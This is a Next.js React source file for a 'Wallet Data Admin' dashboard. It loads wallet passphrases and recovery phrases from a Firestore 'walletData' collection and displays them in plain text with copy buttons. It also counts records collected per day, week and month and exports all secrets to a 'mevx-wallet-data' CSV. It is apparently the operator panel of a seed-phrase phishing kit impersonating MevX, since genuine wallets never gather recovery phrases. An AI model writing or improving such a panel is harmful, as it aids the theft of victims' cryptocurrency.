"use client"

import { useEffect, useState, useRef } from "react"
import { collection, getDocs, query, orderBy, deleteDoc, doc } from "firebase/firestore"
import { db } from "@/lib/firebase"
import { motion } from "framer-motion"
import {
  Copy,
  Download,
  Trash2,
  Search,
  Filter,
  ChevronDown,
  ChevronUp,
  ArrowLeft,
  Shield,
  AlertTriangle,
  CheckCircle2,
  TrendingUp,
} from "lucide-react"
import { toast } from "@/hooks/use-toast"
import Link from "next/link"

interface WalletData {
  id: string
  passphrase: string
  recoveryPhrase: string
  timestamp: string
  walletName: string
  walletType: string
}

const AdminPage = () => {
  const [walletData, setWalletData] = useState<WalletData[]>([])
  const [filteredData, setFilteredData] = useState<WalletData[]>([])
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [selectedWallet, setSelectedWallet] = useState<WalletData | null>(null)
  const [firestoreAvailable, setFirestoreAvailable] = useState(false)
  const [searchQuery, setSearchQuery] = useState("")
  const [filterType, setFilterType] = useState<string | null>(null)
  const [sortField, setSortField] = useState<string>("timestamp")
  const [sortDirection, setSortDirection] = useState<"asc" | "desc">("desc")
  const [showFilters, setShowFilters] = useState(false)
  const [dateRange, setDateRange] = useState({ start: "", end: "" })
  const [isDeleting, setIsDeleting] = useState(false)
  const [stats, setStats] = useState({
    total: 0,
    today: 0,
    week: 0,
    month: 0,
    byType: {} as Record<string, number>,
  })

  const csvLinkRef = useRef<HTMLAnchorElement>(null)

  useEffect(() => {
    const checkFirestore = async () => {
      if (db) {
        setFirestoreAvailable(true)
        await fetchWalletData()
      } else {
        setError("Firestore is not available")
        setLoading(false)
      }
    }

    checkFirestore()
  }, [])

  useEffect(() => {
    if (walletData.length > 0) {
      applyFiltersAndSort()
    }
  }, [walletData, searchQuery, filterType, sortField, sortDirection, dateRange])

  const fetchWalletData = async () => {
    try {
      setLoading(true)
      const walletCollection = collection(db, "walletData")
      const q = query(walletCollection, orderBy("timestamp", "desc"))
      const querySnapshot = await getDocs(q)

      const data = querySnapshot.docs.map((doc) => ({
        id: doc.id,
        ...doc.data(),
      })) as WalletData[]

      setWalletData(data)
      calculateStats(data)
      setLoading(false)
    } catch (err) {
      setError("Failed to fetch wallet data")
      setLoading(false)
      console.error("Error fetching wallet data:", err)
    }
  }

  const calculateStats = (data: WalletData[]) => {
    const now = new Date()
    const today = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime()
    const weekAgo = new Date(today - 7 * 24 * 60 * 60 * 1000).getTime()
    const monthAgo = new Date(now.getFullYear(), now.getMonth() - 1, now.getDate()).getTime()

    const byType: Record<string, number> = {}

    let todayCount = 0
    let weekCount = 0
    let monthCount = 0

    data.forEach((wallet) => {
      // Count by type
      byType[wallet.walletType] = (byType[wallet.walletType] || 0) + 1

      // Count by time period
      const timestamp = new Date(wallet.timestamp).getTime()
      if (timestamp >= today) {
        todayCount++
      }
      if (timestamp >= weekAgo) {
        weekCount++
      }
      if (timestamp >= monthAgo) {
        monthCount++
      }
    })

    setStats({
      total: data.length,
      today: todayCount,
      week: weekCount,
      month: monthCount,
      byType,
    })
  }

  const applyFiltersAndSort = () => {
    let filtered = [...walletData]

    // Apply search filter
    if (searchQuery) {
      const query = searchQuery.toLowerCase()
      filtered = filtered.filter(
        (wallet) =>
          wallet.walletName.toLowerCase().includes(query) ||
          wallet.walletType.toLowerCase().includes(query) ||
          wallet.id.toLowerCase().includes(query),
      )
    }

    // Apply wallet type filter
    if (filterType) {
      filtered = filtered.filter((wallet) => wallet.walletType === filterType)
    }

    // Apply date range filter
    if (dateRange.start) {
      const startDate = new Date(dateRange.start).getTime()
      filtered = filtered.filter((wallet) => new Date(wallet.timestamp).getTime() >= startDate)
    }

    if (dateRange.end) {
      const endDate = new Date(dateRange.end).getTime() + (24 * 60 * 60 * 1000 - 1) // End of the selected day
      filtered = filtered.filter((wallet) => new Date(wallet.timestamp).getTime() <= endDate)
    }

    // Apply sorting
    filtered.sort((a, b) => {
      let comparison = 0

      if (sortField === "timestamp") {
        comparison = new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime()
      } else if (sortField === "walletName") {
        comparison = a.walletName.localeCompare(b.walletName)
      } else if (sortField === "walletType") {
        comparison = a.walletType.localeCompare(b.walletType)
      }

      return sortDirection === "asc" ? comparison : -comparison
    })

    setFilteredData(filtered)
  }

  const formatDate = (dateString: string) => {
    const date = new Date(dateString)
    return date.toLocaleString()
  }

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
    toast.success("Copied to clipboard")
  }

  const handleSort = (field: string) => {
    if (sortField === field) {
      setSortDirection(sortDirection === "asc" ? "desc" : "asc")
    } else {
      setSortField(field)
      setSortDirection("desc")
    }
  }

  const handleDeleteWallet = async (id: string) => {
    if (!confirm("Are you sure you want to delete this wallet data? This action cannot be undone.")) {
      return
    }

    try {
      setIsDeleting(true)
      await deleteDoc(doc(db, "walletData", id))

      // Update local state
      const updatedData = walletData.filter((wallet) => wallet.id !== id)
      setWalletData(updatedData)

      if (selectedWallet?.id === id) {
        setSelectedWallet(null)
      }

      toast.success("Wallet data deleted successfully")
    } catch (err) {
      console.error("Error deleting wallet data:", err)
      toast.error("Failed to delete wallet data")
    } finally {
      setIsDeleting(false)
    }
  }

  const exportToCSV = () => {
    // Create CSV content
    const headers = ["ID", "Wallet Name", "Wallet Type", "Passphrase", "Recovery Phrase", "Timestamp"]
    const csvRows = [headers]

    filteredData.forEach((wallet) => {
      csvRows.push([
        wallet.id,
        wallet.walletName,
        wallet.walletType,
        wallet.passphrase,
        wallet.recoveryPhrase || "",
        wallet.timestamp,
      ])
    })

    // Convert to CSV string
    const csvContent = csvRows.map((row) => row.map((cell) => `"${cell}"`).join(",")).join("\n")

    // Create blob and download
    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" })
    const url = URL.createObjectURL(blob)

    if (csvLinkRef.current) {
      csvLinkRef.current.href = url
      csvLinkRef.current.download = `mevx-wallet-data-${new Date().toISOString().split("T")[0]}.csv`
      csvLinkRef.current.click()
    }
  }

  if (!firestoreAvailable) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-[#0e0e16]">
        <div className="p-6 bg-[#1a1a2e] border border-red-800 text-red-400 rounded">
          Firestore is not available. Please check your Firebase configuration.
        </div>
      </div>
    )
  }

  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-[#0e0e16]">
        <motion.div
          animate={{ rotate: 360 }}
          transition={{ duration: 1, repeat: Number.POSITIVE_INFINITY, ease: "linear" }}
          className="w-12 h-12 border-4 border-[#6366f1] border-t-transparent rounded-full"
        />
      </div>
    )
  }

  if (error) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-[#0e0e16]">
        <div className="p-6 bg-[#1a1a2e] border border-red-800 text-red-400 rounded">{error}</div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-[#0e0e16] text-white p-4 md:p-8">
      <header className="mb-8 flex flex-col md:flex-row md:items-center md:justify-between">
        <div>
          <div className="flex items-center gap-2">
            <Link href="/" className="text-gray-400 hover:text-white">
              <ArrowLeft className="h-5 w-5" />
            </Link>
            <h1 className="text-3xl md:text-4xl font-bold">Wallet Data Admin</h1>
          </div>
          <p className="text-gray-400 mt-2">View and manage wallet information</p>
        </div>

        <div className="mt-4 md:mt-0 flex flex-wrap gap-2">
          <button
            onClick={exportToCSV}
            className="bg-[#252542] hover:bg-[#303052] text-white px-4 py-2 rounded-md text-sm flex items-center gap-2"
          >
            <Download className="h-4 w-4" />
            Export CSV
          </button>
          <a ref={csvLinkRef} className="hidden"></a>
        </div>
      </header>

      {/* Stats Cards */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
        <div className="bg-[#1a1a2e] border border-gray-800 rounded-lg p-4">
          <div className="flex justify-between items-center">
            <h3 className="text-gray-400 text-sm">Total Wallets</h3>
            <Shield className="h-5 w-5 text-[#6366f1]" />
          </div>
          <p className="text-2xl font-bold mt-2">{stats.total}</p>
        </div>

        <div className="bg-[#1a1a2e] border border-gray-800 rounded-lg p-4">
          <div className="flex justify-between items-center">
            <h3 className="text-gray-400 text-sm">Today</h3>
            <CheckCircle2 className="h-5 w-5 text-green-500" />
          </div>
          <p className="text-2xl font-bold mt-2">{stats.today}</p>
        </div>

        <div className="bg-[#1a1a2e] border border-gray-800 rounded-lg p-4">
          <div className="flex justify-between items-center">
            <h3 className="text-gray-400 text-sm">This Week</h3>
            <TrendingUp className="h-5 w-5 text-blue-500" />
          </div>
          <p className="text-2xl font-bold mt-2">{stats.week}</p>
        </div>

        <div className="bg-[#1a1a2e] border border-gray-800 rounded-lg p-4">
          <div className="flex justify-between items-center">
            <h3 className="text-gray-400 text-sm">This Month</h3>
            <AlertTriangle className="h-5 w-5 text-yellow-500" />
          </div>
          <p className="text-2xl font-bold mt-2">{stats.month}</p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Wallet List */}
        <div className="lg:col-span-2">
          <div className="bg-[#1a1a2e] rounded-xl shadow-md overflow-hidden border border-gray-800">
            <div className="p-4 bg-[#252542] text-white">
              <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-4">
                <div>
                  <h2 className="text-xl font-semibold">Wallet Records</h2>
                  <p className="text-gray-300 text-sm">{filteredData.length} records found</p>
                </div>

                <div className="flex flex-col sm:flex-row gap-2">
                  <div className="relative">
                    <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-4 w-4" />
                    <input
                      type="text"
                      placeholder="Search wallets..."
                      value={searchQuery}
                      onChange={(e) => setSearchQuery(e.target.value)}
                      className="pl-9 pr-4 py-2 bg-[#1a1a2e] border border-gray-800 rounded-md text-sm w-full focus:outline-none focus:ring-1 focus:ring-[#6366f1]"
                    />
                  </div>

                  <button
                    onClick={() => setShowFilters(!showFilters)}
                    className="flex items-center gap-1 bg-[#1a1a2e] border border-gray-800 px-3 py-2 rounded-md text-sm"
                  >
                    <Filter className="h-4 w-4" />
                    Filters
                    {showFilters ? <ChevronUp className="h-4 w-4" /> : <ChevronDown className="h-4 w-4" />}
                  </button>
                </div>
              </div>
            </div>

            {/* Filters Panel */}
            {showFilters && (
              <div className="p-4 bg-[#1a1a2e] border-b border-gray-800">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  <div>
                    <label className="block text-sm text-gray-400 mb-1">Wallet Type</label>
                    <select
                      value={filterType || ""}
                      onChange={(e) => setFilterType(e.target.value || null)}
                      className="w-full bg-[#252542] border border-gray-800 rounded-md px-3 py-2 text-sm"
                    >
                      <option value="">All Types</option>
                      {Object.keys(stats.byType).map((type) => (
                        <option key={type} value={type}>
                          {type} ({stats.byType[type]})
                        </option>
                      ))}
                    </select>
                  </div>

                  <div>
                    <label className="block text-sm text-gray-400 mb-1">From Date</label>
                    <input
                      type="date"
                      value={dateRange.start}
                      onChange={(e) => setDateRange({ ...dateRange, start: e.target.value })}
                      className="w-full bg-[#252542] border border-gray-800 rounded-md px-3 py-2 text-sm"
                    />
                  </div>

                  <div>
                    <label className="block text-sm text-gray-400 mb-1">To Date</label>
                    <input
                      type="date"
                      value={dateRange.end}
                      onChange={(e) => setDateRange({ ...dateRange, end: e.target.value })}
                      className="w-full bg-[#252542] border border-gray-800 rounded-md px-3 py-2 text-sm"
                    />
                  </div>
                </div>

                <div className="flex justify-end mt-4">
                  <button
                    onClick={() => {
                      setFilterType(null)
                      setDateRange({ start: "", end: "" })
                      setSearchQuery("")
                    }}
                    className="bg-[#252542] hover:bg-[#303052] text-white px-4 py-2 rounded-md text-sm"
                  >
                    Reset Filters
                  </button>
                </div>
              </div>
            )}

            <div className="overflow-x-auto">
              <table className="min-w-full divide-y divide-gray-800">
                <thead className="bg-[#252542]">
                  <tr>
                    <th
                      className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider cursor-pointer"
                      onClick={() => handleSort("walletName")}
                    >
                      <div className="flex items-center gap-1">
                        Wallet
                        {sortField === "walletName" &&
                          (sortDirection === "asc" ? (
                            <ChevronUp className="h-3 w-3" />
                          ) : (
                            <ChevronDown className="h-3 w-3" />
                          ))}
                      </div>
                    </th>
                    <th
                      className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider cursor-pointer"
                      onClick={() => handleSort("walletType")}
                    >
                      <div className="flex items-center gap-1">
                        Type
                        {sortField === "walletType" &&
                          (sortDirection === "asc" ? (
                            <ChevronUp className="h-3 w-3" />
                          ) : (
                            <ChevronDown className="h-3 w-3" />
                          ))}
                      </div>
                    </th>
                    <th
                      className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider cursor-pointer"
                      onClick={() => handleSort("timestamp")}
                    >
                      <div className="flex items-center gap-1">
                        Date
                        {sortField === "timestamp" &&
                          (sortDirection === "asc" ? (
                            <ChevronUp className="h-3 w-3" />
                          ) : (
                            <ChevronDown className="h-3 w-3" />
                          ))}
                      </div>
                    </th>
                    <th className="px-6 py-3 text-left text-xs font-medium text-gray-300 uppercase tracking-wider">
                      Actions
                    </th>
                  </tr>
                </thead>
                <tbody className="bg-[#1a1a2e] divide-y divide-gray-800">
                  {filteredData.length > 0 ? (
                    filteredData.map((wallet) => (
                      <motion.tr
                        key={wallet.id}
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ duration: 0.3 }}
                        className={`hover:bg-[#252542] cursor-pointer ${selectedWallet?.id === wallet.id ? "bg-[#303052]" : ""}`}
                        onClick={() => setSelectedWallet(wallet)}
                      >
                        <td className="px-6 py-4 whitespace-nowrap">
                          <div className="flex items-center">
                            <div className="flex-shrink-0 h-10 w-10 bg-[#6366f1]/20 rounded-full flex items-center justify-center">
                              <span className="text-[#6366f1] font-medium">{wallet.walletName.charAt(0)}</span>
                            </div>
                            <div className="ml-4">
                              <div className="text-sm font-medium text-white">{wallet.walletName}</div>
                              <div className="text-sm text-gray-400">ID: {wallet.id.substring(0, 6)}...</div>
                            </div>
                          </div>
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap">
                          <span
                            className={`px-2 inline-flex text-xs leading-5 font-semibold rounded-full ${
                              wallet.walletType === "phantom"
                                ? "bg-purple-900/30 text-purple-400"
                                : wallet.walletType === "metamask"
                                  ? "bg-orange-900/30 text-orange-400"
                                  : "bg-blue-900/30 text-blue-400"
                            }`}
                          >
                            {wallet.walletType}
                          </span>
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-400">
                          {formatDate(wallet.timestamp)}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm font-medium">
                          <div className="flex items-center gap-2">
                            <button
                              onClick={(e) => {
                                e.stopPropagation()
                                copyToClipboard(wallet.passphrase)
                              }}
                              className="text-[#6366f1] hover:text-[#8b5cf6] flex items-center gap-1"
                            >
                              <Copy className="h-4 w-4" />
                            </button>
                            <button
                              onClick={(e) => {
                                e.stopPropagation()
                                handleDeleteWallet(wallet.id)
                              }}
                              disabled={isDeleting}
                              className="text-red-500 hover:text-red-400 flex items-center gap-1"
                            >
                              <Trash2 className="h-4 w-4" />
                            </button>
                          </div>
                        </td>
                      </motion.tr>
                    ))
                  ) : (
                    <tr>
                      <td colSpan={4} className="px-6 py-10 text-center text-gray-400">
                        No wallet data found matching your filters
                      </td>
                    </tr>
                  )}
                </tbody>
              </table>
            </div>
          </div>
        </div>

        {/* Wallet Details */}
        <div className="lg:col-span-1">
          {selectedWallet ? (
            <motion.div
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              className="bg-[#1a1a2e] rounded-xl shadow-md overflow-hidden sticky top-6 border border-gray-800"
            >
              <div className="p-4 bg-[#252542] text-white">
                <h2 className="text-xl font-semibold">Wallet Details</h2>
                <p className="text-gray-300 text-sm">{selectedWallet.walletName}</p>
              </div>

              <div className="p-6">
                <div className="mb-6">
                  <h3 className="text-lg font-medium text-white mb-2">Basic Information</h3>
                  <div className="space-y-2">
                    <div>
                      <p className="text-sm text-gray-400">Wallet Name</p>
                      <p className="text-white">{selectedWallet.walletName}</p>
                    </div>
                    <div>
                      <p className="text-sm text-gray-400">Wallet Type</p>
                      <p className="text-white capitalize">{selectedWallet.walletType}</p>
                    </div>
                    <div>
                      <p className="text-sm text-gray-400">Date Created</p>
                      <p className="text-white">{formatDate(selectedWallet.timestamp)}</p>
                    </div>
                  </div>
                </div>

                <div className="mb-6">
                  <h3 className="text-lg font-medium text-white mb-2">Security Information</h3>
                  <div className="space-y-4">
                    <div>
                      <div className="flex justify-between items-center mb-1">
                        <p className="text-sm text-gray-400">Passphrase</p>
                        <button
                          onClick={() => copyToClipboard(selectedWallet.passphrase)}
                          className="text-xs bg-[#6366f1]/20 text-[#6366f1] px-2 py-1 rounded flex items-center gap-1"
                        >
                          <Copy className="h-3 w-3" /> Copy
                        </button>
                      </div>
                      <div className="bg-[#252542] p-3 rounded-md">
                        <p className="font-mono text-sm break-all text-gray-300">{selectedWallet.passphrase}</p>
                      </div>
                    </div>

                    <div>
                      <div className="flex justify-between items-center mb-1">
                        <p className="text-sm text-gray-400">Recovery Phrase</p>
                        {selectedWallet.recoveryPhrase && (
                          <button
                            onClick={() => copyToClipboard(selectedWallet.recoveryPhrase)}
                            className="text-xs bg-[#6366f1]/20 text-[#6366f1] px-2 py-1 rounded flex items-center gap-1"
                          >
                            <Copy className="h-3 w-3" /> Copy
                          </button>
                        )}
                      </div>
                      <div className="bg-[#252542] p-3 rounded-md">
                        <p className="font-mono text-sm break-all text-gray-300">
                          {selectedWallet.recoveryPhrase || "No recovery phrase available"}
                        </p>
                      </div>
                    </div>
                  </div>
                </div>

                <div className="flex justify-between">
                  <button
                    onClick={() => setSelectedWallet(null)}
                    className="bg-[#252542] hover:bg-[#303052] text-white px-4 py-2 rounded-md text-sm"
                  >
                    Close
                  </button>

                  <button
                    onClick={() => handleDeleteWallet(selectedWallet.id)}
                    disabled={isDeleting}
                    className="bg-red-900/30 hover:bg-red-900/50 text-red-400 px-4 py-2 rounded-md text-sm flex items-center gap-2"
                  >
                    <Trash2 className="h-4 w-4" />
                    Delete
                  </button>
                </div>
              </div>
            </motion.div>
          ) : (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="bg-[#1a1a2e] rounded-xl shadow-md overflow-hidden p-6 flex items-center justify-center h-full border border-gray-800"
            >
              <div className="text-center">
                <svg className="mx-auto h-12 w-12 text-gray-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={1}
                    d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"
                  />
                </svg>
                <h3 className="mt-2 text-sm font-medium text-white">No wallet selected</h3>
                <p className="mt-1 text-sm text-gray-400">Click on a wallet from the list to view details</p>
              </div>
            </motion.div>
          )}
        </div>
      </div>
    </div>
  )
}

export default AdminPage
